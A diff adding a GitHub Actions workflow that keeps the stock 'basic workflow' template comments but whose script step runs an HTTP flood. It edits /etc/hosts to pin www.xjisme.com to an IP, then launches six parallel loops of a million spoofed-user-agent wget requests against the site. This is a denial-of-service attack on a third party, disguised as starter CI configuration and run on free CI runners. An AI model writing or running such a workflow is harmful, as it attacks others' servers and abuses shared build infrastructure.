@@ -1,0 +1,54 @@
+# This is a basic workflow to help you get started with Actions
+
+name: CI
+
+# Controls when the action will run. Triggers the workflow on push or pull request
+# events but only for the master branch
+on:
+  push:
+    branches: [ master ]
+  pull_request:
+    branches: [ master ]
+
+# A workflow run is made up of one or more jobs that can run sequentially or in parallel
+jobs:
+  # This workflow contains a single job called "build"
+  build:
+    # The type of runner that the job will run on
+    runs-on: ubuntu-latest
+
+    # Steps represent a sequence of tasks that will be executed as part of the job
+    steps:
+    # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
+    - uses: actions/checkout@v2
+
+    # Runs a single command using the runners shell
+    - name: Run a one-line script
+      run: echo Hello, world!
+
+    # Runs a set of commands using the runners shell
+    - name: Run a multi-line script
+      run: |
+          sudo chmod 777 /etc/hosts
+          echo "134.175.69.238 www.xjisme.com" >> /etc/hosts
+          cat << EOF >>1.sh
+          web=https://www.xjisme.com/?btwaf=46334525
+          i=0
+          while (( i < 1000000 ))
+          do
+            i=\$((\$i+1))
+            echo \$i
+            wget  --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" -O /dev/null \$web
+          done
+          EOF
+          cat 1.sh
+          mkdir bin
+          cat << EOF >>2.sh
+          for i in {1..5} 
+          do
+            echo "Hello, welcome \$i  times "
+            nohup bash 1.sh &>>bin/\$i &
+          done
+          EOF
+          bash 2.sh
+          bash 1.sh
